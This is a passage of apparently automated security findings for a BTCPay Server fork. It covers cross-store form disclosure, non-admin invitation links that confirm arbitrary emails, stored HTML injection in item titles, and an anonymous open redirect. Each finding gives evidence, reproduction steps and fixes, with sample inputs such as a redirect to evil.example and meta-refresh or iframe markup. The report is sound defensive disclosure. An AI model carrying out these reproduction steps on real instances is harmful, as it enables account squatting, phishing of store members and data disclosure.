A hostile tenant (owner or member with CanModifyPaymentRequests in store A) sets the FormId of one of their payment requests to the id of a non-public form belonging to store B — via the edit POST (UIPaymentRequestController.cs:304 copies viewModel.FormId verbatim; the drop-down is only a UI hint) or the Greenfield POST/PUT (GreenfieldPaymentRequestsController.cs:222). Visiting /payment-requests/{prA}/form (anonymous) then renders store B's form definition — field names, labels, help text, select options, default values and the values of Constant fields (including invoice_amount_adjustment-style pricing fields) — under store A's branding, and PayPaymentRequest (437-444) redirects every payer of PR A to it. Responses are stored in A's blob, so nothing is written to store B; the impact is cross-store disclosure of B's form configuration.

Bound on the gain: while B keeps a form attached to a public payment request / PoS / crowdfund flow, payers see its definition by design, so the bypass adds nothing then. FormData.Id is a string key marked DatabaseGenerated(Identity) with no DB default, which under EF Core 10.0.12 (pinned in BTCPayServer.Data.csproj) is client-generated as a GUID string (assumption), so ids are not enumerable. They leak via srvModel.formId on any of B's public payment-request pages (ViewPaymentRequest.cshtml:39 serialises the whole view model, which carries FormId, including after the form was submitted or the PR archived) and to past members of B. What the attacker gains is therefore the ability to keep reading — and watch edits to — a form B has since detached, consumed (FormResponse set) or restricted to members, which the forms plugin's own control denies to anyone without CanViewStoreSettings on B.

The same unscoped lookup and unvalidated FormId exist for PoS and Crowdfund app settings (UIPointOfSaleController.cs:729/328/481/526, UICrowdfundController.cs:531/164/281/320, GreenfieldAppsController.cs:359/391), so the remediation must scope every consumer of FormDataService.GetForm(id), not only the payment-request controller.

## Evidence
1. [BTCPayServer/Controllers/UIPaymentRequestController.cs:365–371](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Controllers/UIPaymentRequestController.cs#L365-L371)
   ViewPaymentRequestForm ([AllowAnonymous], GET/POST /payment-requests/{payReqId}/form) loads the form with FormDataService.GetForm(prFormId) — the overload without a storeId — and parses/renders formData.Config. There is no check that formData.StoreId equals result.StoreDataId and no check of formData.Public.
2. [BTCPayServer/Controllers/UIPaymentRequestController.cs:304](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Controllers/UIPaymentRequestController.cs#L304)
   EditPaymentRequest POST (CanModifyPaymentRequests on store A) copies viewModel.FormId into the blob verbatim; the preceding validation (lines 242-275) checks currency, archive state and ReferenceId uniqueness but never that FormId names one of store A's forms or a hardcoded option.
3. [BTCPayServer/Controllers/GreenField/GreenfieldPaymentRequestsController.cs:222–223](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Controllers/GreenField/GreenfieldPaymentRequestsController.cs#L222-L223)
   Greenfield create/update stores request.FormId into the blob without validating it belongs to the store, giving an API-key holder with CanModifyPaymentRequests the same ability.
4. [BTCPayServer/Plugins/Forms/FormDataService.cs:84–109](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/Forms/FormDataService.cs#L84-L109)
   Two overloads: GetForm(storeId, id) filters on StoreId, GetForm(id) returns any store's form by id (after the hardcoded Email/Address entries). The payment-request, PoS and Crowdfund controllers all call the unscoped overload.
5. [BTCPayServer/Plugins/Forms/UIFormsController.cs:140–154](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/Forms/UIFormsController.cs#L140-L154)
   The shipped control for rendering a form by id to the public: ViewPublicForm 404s when !formData.Public unless the caller is authorized for CanViewStoreSettings on formData.StoreId. The payment-request path renders the same object without this check.
6. [BTCPayServer/Views/UIPaymentRequest/ViewPaymentRequest.cshtml:39](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Views/UIPaymentRequest/ViewPaymentRequest.cshtml#L39)
   `var srvModel = @Safe.Json(Model)` serialises ViewPaymentRequestViewModel, whose FormId property (ListPaymentRequestsViewModel.cs:196) exposes the victim store's form id to any anonymous viewer of its public payment-request page — the realistic way the attacker learns a non-enumerable id.
7. [BTCPayServer/Plugins/PointOfSale/Controllers/UIPointOfSaleController.cs:328](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/PointOfSale/Controllers/UIPointOfSaleController.cs#L328)
   Same root cause in the PoS checkout path: settings.FormId (stored unvalidated from vm.FormId at line 729 and from Greenfield at GreenfieldAppsController.cs:359/391) is resolved with the unscoped GetForm; a fix limited to the payment-request controller leaves this open.
8. [BTCPayServer/Plugins/Crowdfund/Controllers/UICrowdfundController.cs:164](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/Crowdfund/Controllers/UICrowdfundController.cs#L164)
   Same root cause in the Crowdfund contribution path: settings.FormId (stored unvalidated from vm.FormId at line 531) is resolved with the unscoped GetForm.

## Impact
Cross-store read of another store's form definition (field names, labels, help text, options, default and Constant values) in violation of the CanViewStoreSettings gate the forms plugin enforces for non-public forms; limited to forms whose id the attacker already learned and that the victim no longer exposes publicly. No data is written to the victim store (responses land in the attacker's own payment request) and no availability effect.

## Reproduction steps
1. Attacker is an authenticated member of their own store holding CanModifyPaymentRequests (a self-registered tenant where registration is open, or an API key with that permission) — low privilege. They set a victim store's form id as FormId on their own payment request via the UI POST or the Greenfield API and open the public /payment-requests/{id}/form URL; no victim interaction. The form id is a client-generated GUID (EF Core 10.0.12 assumption), not enumerable, and must be learned from the victim's public payment-request page JSON (srvModel.formId) or prior membership — hence attack requirements present.

## Recommended fix
1. Payment-request (and PoS/Crowdfund) settings accept an arbitrary FormId string and the public rendering paths resolve it with the store-unscoped FormDataService.GetForm(id), ignoring the owning store and the Public flag. Fix criteria: A payment request can only reference forms that belong to its own store (or the hardcoded Email/Address options): EditPaymentRequest and the Greenfield create/update reject a FormId that is not one of the store's forms, and ViewPaymentRequestForm/PayPaymentRequest resolve the form with the store-scoped lookup so a stale cross-store reference renders nothing. Verify by setting store B's form id on store A's payment request: the edit must fail with a validation error and /payment-requests/{id}/form must redirect or 404.
2. The same unscoped lookup backs the PoS and Crowdfund app checkout paths, whose FormId settings are likewise stored without ownership validation (UI and Greenfield apps API). Fix criteria: PoS and Crowdfund app settings reject a FormId not owned by the app's store, and their form-rendering/validation paths use the store-scoped lookup (or the unscoped FormDataService.GetForm(id) overload is removed from public rendering code entirely). Verify by setting another store's form id via the Greenfield apps API: the update must be rejected and the app's form page must not render it.

---
**Severity:** LOW
**Status:** Open
**Category:** Insecure Direct Object Reference
**CWE:** [CWE-639](https://cwe.mitre.org/data/definitions/639.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** LOW
**User interaction:** NONE
**Vulnerable system confidentiality impact:** LOW
**Vulnerable system integrity impact:** NONE
**Vulnerable system availability impact:** NONE
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/btcpayserver
**Branch:** main
**Commit:** 165bbbd3d1a2cfe1d463407b1fc172edb90c0586
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_01T8kzaYNjL5FRBR7tZd6bAT&finding=scan_01PpWUp1JYcSoiTiFe8zzgGU-5257437

---

# Non-admin user creation returns invitation link that confirms arbitrary email without mailbox access

## Details
BTCPay Server's 'Email confirmation required' policy (PoliciesSettings.RequiresConfirmedEmail) is meant to ensure an account's email is owned by the person using it: accounts are created unconfirmed and CanLogin refuses them until ConfirmEmail is reached from the mailbox. Administrators are allowed to vouch for invitees: when an admin creates a user, an invitation link is produced and GET /invite/{userId}/{code} (anonymous) auto-confirms the email by generating the confirmation token server-side (RedirectToConfirmEmail) before sending the invitee to set a password.

The same invitation machinery is handed to non-administrators. In GreenfieldUsersController.CreateUser, when registration is open (LockSubscription false) and DisableNonAdminCreateUserApi is false (default), any Greenfield-authenticated principal can create a user; the handler then calls UserEvent.Registered.Create(user, currentUser, ...) with the caller as invitedBy, which generates an invitation token, and returns InvitationUrl to the caller via ForAPI(user, true). The caller may set sendInvitationEmail=false so the address owner is never notified, and may supply the password directly.

Attack: a self-registered user (adversary 2) obtains any API key (or uses Basic auth), POSTs /api/v1/users {email: 'alice@victim.example', password, sendInvitationEmail: false}, receives invitationUrl, opens it anonymously: AcceptInvite sees RequiresEmailConfirmation && !EmailConfirmed, redirects to ConfirmEmail with a freshly minted code, and the account becomes EmailConfirmed. The attacker now logs in (cookie or API) as 'alice@victim.example' with a confirmed address, something the policy exists to prevent. If RequiresUserApproval is also on, the account still needs admin approval, but the admin sees a confirmed-looking account under the spoofed address. The UI path has the same shape: a store owner adding an unknown email on /stores/{id}/users creates the account, is shown the invitation link, and the account is placed in the store immediately.

Consequences inside the instance: identity squatting of arbitrary addresses (the real owner can only recover via password reset), and misdirected grants, since store owners and the Greenfield AddStoreUser endpoint add members by email (FindByIdOrEmail), so a later 'add alice@victim.example' hands the attacker that store's access. The invitation token itself is 48 bits, has no expiry, and is accepted indefinitely until used.

Root cause: the 'inviter vouches for the invitee's email' privilege is tied to merely being authenticated (invitedBy != null) rather than to an administrative capability; the invitation link is returned to any creator, and AcceptInvite auto-confirms regardless of who issued the invitation. Preconditions: an admin exists, LockSubscription is false (open registration, non-default but the configuration of multi-tenant/public hosts) and RequiresConfirmedEmail is true.

## Evidence
1. [BTCPayServer/Controllers/GreenField/GreenfieldUsersController.cs:428–429](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Controllers/GreenField/GreenfieldUsersController.cs#L428-L429)
   After creating the account, CreateUser publishes UserEvent.Registered.Create(user, await _userManager.GetUserAsync(User), ...). The Greenfield API-key principal carries the UserIdClaimType claim (Security/GreenField/APIKeysAuthenticationHandler.cs:59), so for any authenticated caller invitedBy is non-null, an Invited event is built (generating and storing an invitation token on the new account) and ForAPI(user, true) returns invitationUrl in the 201 response to the creator, whether or not the creator is an admin.
2. [BTCPayServer/Controllers/GreenField/GreenfieldUsersController.cs:334–371](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Controllers/GreenField/GreenfieldUsersController.cs#L334-L371)
   Authorization for the non-admin path: when an admin exists, LockSubscription is false and DisableNonAdminCreateUserApi is false (default), any Greenfield-authenticated principal (API key with any permission set, or Basic auth) reaches account creation with no policy requirement (isAdmin false, the CanCreateUser block at 356-362 is skipped). The account is created with RequiresEmailConfirmation = policies.RequiresConfirmedEmail, EmailConfirmed false, Approved = false. Project test GreenfieldAPITests.cs:1220-1222 exercises exactly this non-admin creation.
3. [BTCPayServer/Controllers/UIAccountController.cs:771–810](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Controllers/UIAccountController.cs#L771-L810)
   Sink: [AllowAnonymous] GET /invite/{userId}/{code} validates the invitation token and, when the account requires email confirmation and is unconfirmed, calls RedirectToConfirmEmail(user) instead of requiring the mailbox link. Holding the invitation link is therefore sufficient to confirm the email.
4. [BTCPayServer/Controllers/UIAccountController.cs:813–817](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Controllers/UIAccountController.cs#L813-L817)
   RedirectToConfirmEmail generates a fresh email-confirmation token server-side and redirects to ConfirmEmail(userId, code) (lines 611-652), which calls ConfirmEmailAsync and, since the Greenfield-created account already has a password, sends the holder to Login; the email is marked confirmed without any message having reached the address.
5. [BTCPayServer/Events/UserEvent.cs:33–43](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Events/UserEvent.cs#L33-L43)
   Registered.Create produces an Invited event with an invitation link whenever invitedBy is non-null; nothing distinguishes an admin inviter from an arbitrary authenticated user. The self-registration path (UIAccountController.cs:579) passes null, which is the only path that sends the confirmation code solely to the mailbox.
6. [BTCPayServer/Controllers/UIStoresController.Users.cs:54–80](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Controllers/UIStoresController.Users.cs#L54-L80)
   UI sibling: a store owner (any user can create a store) who adds an unknown email on /stores/{id}/users creates the account when registration is unlocked (CanCreateUser() at 148-149 => !LockSubscription || CanCreateUser policy) and is shown evt.InvitationLink in serverInviteInfo; the new account is added to the store directly (newAccount bypasses the store-invitation step). Project test StoreInvitationTests.NonAdminStoreOwnerCanCreateAndAddNewUser confirms a non-admin receives this link.
7. [BTCPayServer/UserManagerExtensions.cs:30–33](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/UserManagerExtensions.cs#L30-L33)
   The invitation token is 12 hex characters stored in the user blob with no expiry; FindByInvitationTokenAsync (lines 64-72) accepts it indefinitely until AcceptInvite unsets it.
8. [BTCPayServer/Services/UserService.cs:155–169](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Services/UserService.cs#L155-L169)
   The control being bypassed: DefaultLoginExtension refuses login (cookie, Basic and API-key auth all go through CanLogin) while EmailConfirmed is false and RequiresEmailConfirmation is true.
9. [BTCPayServer/Plugins/Emails/HostedServices/StoreInvitationEventHostedService.cs:50–55](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/Emails/HostedServices/StoreInvitationEventHostedService.cs#L50-L55)
   Consequence path: when another store owner later invites the squatted address, the store-invitation link is delivered as an in-app notification scoped to the account's UserId, i.e. to the attacker logged in as that address, so the grant intended for the real mailbox owner is accepted by the attacker.

## Impact
The attacker obtains a usable, email-confirmed account under an address they do not control, defeating the RequiresConfirmedEmail policy (integrity of account identity, LOW). Because store membership and store invitations are resolved by email (FindByIdOrEmail / FindByEmailAsync) and invitation notifications are delivered in-app to the account, access later intended for the real address holder (store settings, invoices, wallets of that store) is delivered to the attacker instead (confidentiality LOW, contingent on such a grant). The real owner cannot register and can only recover via password reset. No availability impact.

## Reproduction steps
1. Attacker is any authenticated non-admin user (adversary 2) on an instance configured with public registration enabled (LockSubscription false, the mode the 'Email confirmation required' policy is meant to protect) and RequiresConfirmedEmail true; both are operator-chosen, non-default settings, hence AT:P. Steps: create an API key with any permission (or use Basic auth), POST /api/v1/users {email: target, password, sendInvitationEmail: false}; read invitationUrl from the 201 body; open it anonymously, which runs RedirectToConfirmEmail -> ConfirmEmailAsync; log in with the chosen password. Alternatively add the target email on a store's Users page and use the displayed link. No race, no victim action, no admin involvement (unless RequiresUserApproval is also on, in which case the admin is shown an email-confirmed account under the spoofed address). Only the Register rate zone (2r/min) throttles the non-admin creation.

## Recommended fix
1. GreenfieldUsersController.CreateUser and UIStoresController.StoreUsers treat any authenticated creator as an inviter: they generate an invitation token and disclose the invitation link to the creator, although only administrators are trusted to vouch for an invitee's address. Fix criteria: Invitation tokens/links must be issued and disclosed only when the creator holds an administrative capability (e.g. CanManageUsers/CanModifyServerSettings); accounts created by non-admins must follow the self-registration path (no invitation token, confirmation email sent to the address). Verification: a non-admin API key creating a user receives no invitationUrl and the new account's blob has no InvitationToken; the account cannot be confirmed without the emailed code.
2. UIAccountController.AcceptInvite auto-confirms the email of any account that carries an invitation token, regardless of who issued the invitation, so possession of the link substitutes for mailbox ownership. Fix criteria: Email auto-confirmation on invitation acceptance must be limited to invitations issued by administrators (recorded at issuance), or the acceptance flow must still require the mailbox confirmation code. Verification: with RequiresConfirmedEmail on, following a non-admin-issued invitation link leaves EmailConfirmed false and CanLogin refuses until the emailed confirmation link is used.

---
**Severity:** LOW
**Status:** Open
**Category:** Improper authentication
**CWE:** [CWE-287](https://cwe.mitre.org/data/definitions/287.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** LOW
**User interaction:** NONE
**Vulnerable system confidentiality impact:** LOW
**Vulnerable system integrity impact:** LOW
**Vulnerable system availability impact:** NONE
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/btcpayserver
**Branch:** main
**Commit:** 165bbbd3d1a2cfe1d463407b1fc172edb90c0586
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_01T8kzaYNjL5FRBR7tZd6bAT&finding=scan_01PpWUp1JYcSoiTiFe8zzgGU-5257435

---

# Stored HTML injection: app item title rendered unsanitized with v-html on PoS/Crowdfund settings pages viewed by other store members

## Details
The shared TemplateEditor partial (used by the Point of Sale settings page and the Crowdfund perks editor) renders each template item's title with Vue's `v-html` directive: `<h5 class="card-title m-0" v-html="item.title"></h5>` (BTCPayServer/Views/Shared/TemplateEditor.cshtml:110). With the bundled Vue 2.7.14 this assigns `innerHTML`. The `items` array is `JSON.parse(initialConfig)` of the stored template (template-editor.js:9) and nothing in the pipeline sanitizes titles: `AppService.Parse` only checks ids (AppService.cs:355-366), the UI POST stores `vm.Template` after a Parse/SerializeTemplate round-trip that leaves Title untouched (UIPointOfSaleController.cs:691), and the Greenfield `PUT /api/v1/apps/pos/{appId}` does the same (GreenfieldAppsController.cs:466-472). The `vue-sanitize-directive` library is loaded and registered (TemplateEditor.cshtml:190, template-editor.js:226) but `v-sanitize` is never applied to the title. The project's sanctioned treatment of HTML in item titles is the HtmlSanitizer (`Safe.Raw(item.Title)` in the public Static/Print views, `_htmlSanitizer.Sanitize(perk.Description)` in CrowdfundPlugin.cs:193); the editor bypasses it entirely.

Who can write a title: any store member holding `CanModifyStoreSettings` (the default Owner role; Manager does not have it) or an API key with that permission. Who views the sink: `GET /apps/{appId}/settings/pos` and `GET /apps/{appId}/settings/crowdfund` require `CanViewStoreSettings` (UIPointOfSaleController.cs:589, UICrowdfundController.cs:361), which the default Owner and Manager roles hold. Server administrators pass that policy on every store through the implicit grant in BuiltInPermissionHandler (lines 24-25, 44-45), but the action's app is resolved by `SetContextFilter` through `appService.GetAppData(userId, appId)` (SetContextFilter.cs:59-62), which selects through `UserStore` rows for the caller, so a server admin who is not a member of the store gets `GetCurrentApp() == null` and a 404. The victims are therefore the hostile Owner's co-members with CanViewStoreSettings: co-Owners, Managers, and server admins who are members of the store (the common shared-instance pattern where the admin provisions the store and remains a member, or an admin who accepted the owner's invitation).

Control present: the global `ContentSecurityPolicyAttribute(CSPTemplate.AntiXSS)` (Startup.cs:166-167) emits only `script-src 'self'` plus per-page sha256 hashes and, on these two pages, `'unsafe-eval'` (ContentSecurityPolicyAttribute.cs:22-28, UpdatePointOfSale.cshtml:10). It sets no default-src, style-src, frame-src, form-action or base-uri. Inline scripts, event handlers and `javascript:` URLs injected through innerHTML are therefore blocked, but all other markup takes effect in the victim's authenticated session on the BTCPay origin: `<meta http-equiv="refresh">` (immediate redirect of the viewer to an attacker site, e.g. a lookalike login), `<iframe>` plus `<style>` (a fixed full-page overlay impersonating a BTCPay login or 2FA prompt while the address bar shows the genuine admin URL), `<base href>`, `<link rel=stylesheet>` from any origin and `<button formaction>` inside the surrounding settings form. The impact is stored HTML injection / UI redress against higher-privileged users rather than script execution.

The same partial is reachable through the Crowdfund perks editor (UpdateCrowdfund.cshtml:197), so the fix must cover both consumers. The public PoS/Crowdfund views are not affected: they render titles through `Safe.Raw` (sanitized) or Vue text interpolation.

## Evidence
1. [BTCPayServer/Views/Shared/TemplateEditor.cshtml:110](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Views/Shared/TemplateEditor.cshtml#L110)
   Sink: item.title is assigned to innerHTML via v-html (Vue 2.7.14) in the items-editor list; the v-sanitize directive loaded at line 190 is not applied here.
2. [BTCPayServer/wwwroot/js/template-editor.js:9](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/wwwroot/js/template-editor.js#L9)
   items = JSON.parse(initialConfig), i.e. the stored template verbatim; VueSanitizeDirective is registered at line 226 but never used for the title, so no client-side sanitization occurs.
3. [BTCPayServer/Services/Apps/AppService.cs:355–365](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Services/Apps/AppService.cs#L355-L365)
   Parse validates only ids (missing/duplicate); Title is deserialized and re-serialized unchanged on both writer paths.
4. [BTCPayServer/Plugins/PointOfSale/Controllers/UIPointOfSaleController.cs:589–591](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/PointOfSale/Controllers/UIPointOfSaleController.cs#L589-L591)
   Viewer entry point: GET /apps/{appId}/settings/pos requires only CanViewStoreSettings and passes settings.Template raw (line 621) to UpdatePointOfSale.cshtml, which includes the TemplateEditor partial (line 105). The POST at line 691 stores vm.Template after a Parse/Serialize round-trip that does not touch Title.
5. [BTCPayServer/Security/SetContextFilter.cs:59–62](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Security/SetContextFilter.cs#L59-L62)
   The app the action renders is resolved via appService.GetAppData(userId, appId), which selects through the caller's UserStore rows; a server admin who is not a store member therefore gets a 404 despite the implicit CanViewStoreSettings grant (BuiltInPermissionHandler.cs:24-25, 44-45). Victims are co-members holding CanViewStoreSettings, including server admins who are members.
6. [BTCPayServer/Filters/ContentSecurityPolicyAttribute.cs:22–27](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Filters/ContentSecurityPolicyAttribute.cs#L22-L27)
   The shipped AntiXSS CSP sets only script-src 'self' (plus sha256 hashes and 'unsafe-eval' on these pages); no default-src, style-src, frame-src, form-action or base-uri. Script execution is blocked, but <meta refresh>, <iframe>, <style>, <base> and <button formaction> inserted via innerHTML take effect.
7. [BTCPayServer/Plugins/PointOfSale/Views/Public/Static.cshtml:44](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/PointOfSale/Views/Public/Static.cshtml#L44)
   The project's sanctioned rendering of the same Title field passes it through Safe.Raw (HtmlSanitizer); the editor's v-html bypasses that control.
8. [BTCPayServer/Plugins/Crowdfund/Views/UpdateCrowdfund.cshtml:197](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/Crowdfund/Views/UpdateCrowdfund.cshtml#L197)
   Second consumer of the partial (perk titles); GET at UICrowdfundController.cs:361-363 uses the same CanViewStoreSettings policy and passes settings.PerksTemplate raw (line 392).
9. [BTCPayServer/Controllers/GreenField/GreenfieldAppsController.cs:466–471](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Controllers/GreenField/GreenfieldAppsController.cs#L466-L471)
   Second writer path: an API key with CanModifyStoreSettings stores the template after a Parse/Serialize check that leaves Title verbatim.

## Impact
With the shipped CSP intact the attacker cannot execute script, so there is no direct session takeover. They gain arbitrary non-script HTML on an authenticated admin-UI page shown to higher-privileged users: an immediate meta-refresh redirect or a full-page iframe/style overlay impersonating a BTCPay login or 2FA prompt on the genuine origin (credential phishing of co-owners, managers or member server admins), injected links/buttons, and external stylesheets. Integrity of the rendered page is compromised (LOW) and the phishing primitive gives a limited confidentiality exposure (LOW); no availability impact beyond the single page.

## Reproduction steps
1. Attacker: a store Owner (any self-registered user can create a store) or an API key with CanModifyStoreSettings. They save a PoS item or Crowdfund perk whose title is HTML via the Template JSON textarea or the Greenfield API. A co-member of that store holding CanViewStoreSettings (co-Owner, Manager, or a server admin who is a member of the store) opens the store's PoS or Crowdfund settings page and the markup is inserted via innerHTML in their authenticated session; no CSP bypass is needed for the HTML/UI-redress payloads because the shipped policy restricts only script-src (AC:LOW). The attack requires that such a higher-privileged co-member exists in the attacker's store (AT:PRESENT) and that they visit the settings page (UI:PASSIVE).

## Recommended fix
Template item titles are untrusted content authored by store members with CanModifyStoreSettings but are rendered unescaped (v-html, innerHTML) into the PoS and Crowdfund settings pages viewed by other store members, including server admins who are members, bypassing the HtmlSanitizer the project applies to the same field elsewhere. Fix criteria: In the TemplateEditor partial, render item titles as text (interpolation / v-text) or pass them through the sanitizer already loaded for this purpose (v-sanitize) or a server-side HtmlSanitizer pass before they reach the page, covering both the PoS and Crowdfund consumers. Verify by storing a title such as <meta http-equiv=refresh content="0;url=https://example.org"> or <iframe src=https://example.org></iframe> and confirming the settings pages show it literally with no element created and no navigation or frame load.

---
**Severity:** LOW
**Status:** Open
**Category:** Cross-site scripting
**CWE:** [CWE-79](https://cwe.mitre.org/data/definitions/79.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** LOW
**User interaction:** PASSIVE
**Vulnerable system confidentiality impact:** LOW
**Vulnerable system integrity impact:** LOW
**Vulnerable system availability impact:** NONE
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/btcpayserver
**Branch:** main
**Commit:** 165bbbd3d1a2cfe1d463407b1fc172edb90c0586
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_01T8kzaYNjL5FRBR7tZd6bAT&finding=scan_01PpWUp1JYcSoiTiFe8zzgGU-5257433

---

# Anonymous redirectUrl on public PoS/crowdfund POST stored on invoice enables open redirect from the BTCPay domain

## Details
The anonymous PoS POST (`/apps/{appId}/pos`, `[IgnoreAntiforgeryToken]`, `[EnableCors(CorsPolicies.All)]`, UIPointOfSaleController.cs:186-205) accepts a `redirectUrl` form field and gives it precedence over the merchant's configured redirect: `RedirectURL = !string.IsNullOrEmpty(redirectUrl) ? redirectUrl : settings.RedirectUrl ...` (UIPointOfSaleController.cs:414-416). The anonymous crowdfund POST (`/apps/{appId}/crowdfund`, UICrowdfundController.cs:90-96) does the same with `request.RedirectUrl ?? appUrl` (UICrowdfundController.cs:225; field in ContributeToCrowdfund, ViewCrowdfundViewModel.cs:81). `CreateInvoiceCoreRaw` copies the value to `entity.RedirectURLTemplate` after only `Trim()` (UIInvoiceController.cs:201) and `InvoiceEntity.RedirectURL` accepts any absolute http/https URL (InvoiceEntity.cs:496-505): no host allow-list and no comparison with the store website, the configured RedirectUrl or the BTCPay origin. The settings page documents `redirectUrl` as an embedding parameter for the merchant's own site (UIPointOfSaleController.cs:647,659), but nothing authenticates that site, so the parameter is attacker-controlled.

The stored URL is then consumed on anonymous GET pages of the BTCPay domain (reachable for one month after monitoring expiry, ValidateAccessToInvoice UIInvoiceController.UI.cs:1343):
- Default configuration: the checkout page renders it as the `Return to <StoreName>` button (`storeLink` = `merchantRefLink`, checkout.js:186-190; Checkout.cshtml:148,182,219) and, when the store sets RedirectAutomatically, navigates `window.top.location` there after settlement (checkout.js:234-242); the receipt page renders it as `Return to <StoreName>` (InvoiceReceipt.cshtml:192-194, from UIInvoiceController.UI.cs:223).
- Store with receipts disabled (ReceiptOptions default Enabled=true, InvoiceData.cs:53-60): `GET /i/{invoiceId}/receipt` returns a server-side `Redirect(i.RedirectURL)` (UIInvoiceController.UI.cs:211-216).
- Store with receipts disabled and a zero-amount invoice (store AllowZeroAmountInvoices; the PoS keypad/custom-amount path lets the payer choose 0): the invoice has no payment prompts (UIInvoiceController.cs:275-278), so `GetCheckoutModel` returns null and `GET /i/{invoiceId}` 302s to the stored URL (UIInvoiceController.UI.cs:752-765). Expired invoices still render the checkout page, so expiry alone does not trigger this branch.

Attack: an unauthenticated attacker POSTs to the public PoS (or crowdfund) of any store with `redirectUrl=https://evil.example/...` (with `Accept: application/json` the response returns the invoice id directly), then distributes `https://<btcpay-host>/i/<id>/receipt` or `/i/<id>`. Victims who trust the merchant's BTCPay domain are redirected (302) to attacker content, or are shown it as the merchant's own `Return to <StoreName>` link on the trusted checkout/receipt page, enabling impersonation of the merchant or BTCPay (fake "payment failed, pay again here" pages, credential phishing). The only rate limit is the PublicInvoices zone (4 r/min), which does not prevent a single invoice creation.

## Evidence
1. [BTCPayServer/Plugins/PointOfSale/Controllers/UIPointOfSaleController.cs:414–416](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/PointOfSale/Controllers/UIPointOfSaleController.cs#L414-L416)
   Unvalidated anonymous `redirectUrl` POST parameter takes precedence over the store-configured RedirectUrl and the app URL when building the invoice's CheckoutOptions.
2. [BTCPayServer/Plugins/PointOfSale/Controllers/UIPointOfSaleController.cs:186–204](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/PointOfSale/Controllers/UIPointOfSaleController.cs#L186-L204)
   Endpoint is anonymous (no [Authorize]), CORS-open and exempt from antiforgery; `redirectUrl` is a plain form parameter, so any network client can author it.
3. [BTCPayServer/Plugins/Crowdfund/Controllers/UICrowdfundController.cs:225](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/Crowdfund/Controllers/UICrowdfundController.cs#L225)
   Same defect on the anonymous crowdfund contribution POST (attributes at lines 90-96): `RedirectURL = request.RedirectUrl ?? appUrl` with the field bound from the form (ContributeToCrowdfund.RedirectUrl).
